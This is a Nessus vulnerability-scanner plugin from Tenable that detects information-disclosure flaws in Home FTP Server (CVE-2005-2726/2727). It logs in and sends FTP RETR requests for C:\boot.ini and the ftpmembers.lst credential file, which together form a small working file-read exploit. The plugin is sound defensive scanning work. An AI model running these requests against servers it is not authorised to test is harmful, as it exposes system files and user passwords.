#TRUSTED 8ae341edff348c2af481c81731c8ad1401db9637f18462c9b220a13f2d9de867279d4bf0df162395505214692559710545f2eabf6e8a80a36c5232e6c790c4a82a2d75a92e8e36c8481be4f52a5c188a637277936e63986a34f81f83880a3aeed3f7c4f4943d5674cdf27582ec8f2ea4984470138815ce5b7b5b5b688509274642ac7ec3e966cbbfd161c0ba0e012ae89b67291e494f183d93031af89891632de3161e579438beed895e2711e9e09992b627a32d52cb3be99abd36f1d0310cf6ae891422b327d705d442866f291a3d6561d41d39424feb284b2058e3c7ed136fbc961501c74bddfcf1151771cb7cfc6a33179643d7e5ae9bf9371147f5c7211183cbf7fefcafa389139081cd7418e6cd913ad23858d445bbc46aee2548eee5eec376b5c27886c3d6c12f01f37ff41ed863b0140dcad91446e5c43943e0f2241d01d24a11640c311081b9983267cb5b779b8740b52dceea9fa50d989314b1cc67622e152c7302a9a376c876e85cde2bf8712bde2fba85e9dccbd9d0f56351a87ff54d88aa040692c9d808e4758e7b93e51b0e8556cb6f5c6be37b1d6b97d7c017855ab09352cb52bca5146d836ec5ea67688e41bbace7ca2b5b3074adfbf15efbde9846bb697563cacb24188b2e526b3056f705f49d34e2f58753836d413932ee0b76e6c3c2e0efa0634bdaea5e612c9dc2cecba14f4290b6b1d776ee229aeda0
#%NASL_MIN_LEVEL 70300
###
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(19501);
  script_version("1.34");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2005-2726", "CVE-2005-2727");
  script_bugtraq_id(14653);

  script_name(english:"Home FTP Server Multiple Vulnerabilities");

  script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by various information disclosure
issues.");
  script_set_attribute(attribute:"description", value:
"The remote host appears to be running Home Ftp Server, an FTP server
application for Windows. 

The installed version of Home Ftp Server by default lets authenticated
users retrieve configuration files (which contain, for example, the
names and passwords of users defined to the application) as well as
arbitrary files on the remote system.");
  # http://web.archive.org/web/20070129075645/http://www4.autistici.org/fdonato/advisory/HomeFtpServer1.0.7-adv.txt
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a5e13b3f");
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/fulldisclosure/2005/Aug/811");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:S/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2005-2726");

  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/08/24");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/08/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"FTP");

  script_copyright(english:"This script is Copyright (C) 2005-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("ftpserver_detect_type_nd_version.nasl", "ftp_overflow.nasl");
  script_require_keys("ftp/login", "ftp/password");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include('global_settings.inc');
include("misc_func.inc");
include("ftp_func.inc");
include("data_protection.inc");

# nb: to exploit the vulnerability we need to log in.
user = get_kb_item_or_exit("ftp/login");
pass = get_kb_item_or_exit("ftp/password");


port = get_ftp_port(default: 21);

soc = ftp_open_and_authenticate( user:user, pass:pass, port:port );
if (!soc)
{
  exit(1, "cannot login on port "+port+" with supplied FTP credentials");
}


# Make sure it looks like Home Ftp Server.
#
# nb: don't trust the banner since that's completely configurable.
send(socket:soc, data:'SYST\r\n');
s = ftp_recv_line(socket:soc);
if ("UNIX Type: L8 Internet Component Suite" >!< s) {
  exit(0, "Service on port "+port+" doesn't look like Home Ftp Server.");
}


# Try to get boot.ini.
#
# nb: this may fail if another process is accessing the file.
port2 = ftp_pasv(socket:soc);
if (!port2) exit(1, "PASV failed on port "+port+".");
soc2 = open_sock_tcp(port2, transport:ENCAPS_IP);
if (!soc2) exit(1, "Connection refused to passive port "+port+".");

send(socket:soc, data:'RETR C:\\boot.ini\r\n');
s = ftp_recv_line(socket:soc);
if (egrep(string:s, pattern:"^(425|150) ")) {
  file = ftp_recv_data(socket:soc2);

  # There's a problem if it looks like a boot.ini.
  if ("[boot loader]" >< file) {
    report =
'Here are the contents of the file \'\\boot.ini\' that Nessus\n' +
'was able to read from the remote host :\n\n' +
 string(file) ;
    security_warning(port:port, extra:report);
    vuln = 1;
  }
}
close(soc2);


if (thorough_tests && isnull(vuln)) {
  # Try to retrieve the list of users.
  port2 = ftp_pasv(socket:soc);
  if (!port2) exit(1, "PASV failed on port "+port+".");
  soc2 = open_sock_tcp(port2, transport:ENCAPS_IP);
  if (!soc2) exit(1, "Connection refused to passive port "+port+".");

  send(socket:soc, data:'RETR ftpmembers.lst\r\n');
  s = ftp_recv_line(socket:soc);
  if (egrep(string:s, pattern:"^(425|150) ")) {
    file = ftp_recv_data(socket:soc2);

    # There's a problem if it looks like the member's list.
    if ("[ftpmembers]" >< file && "pass=" >< file) {
      report =
'Here are the contents of the file \'ftpmembers.lst\' that Nessus\n' +
'was able to read from the remote host :\n\n' +
  data_protection::sanitize_user_full_redaction(output:file);
      security_warning(port:port, extra:report);
    }
  }
  close(soc2);
}

# Close the connections.
ftp_close(socket:soc);
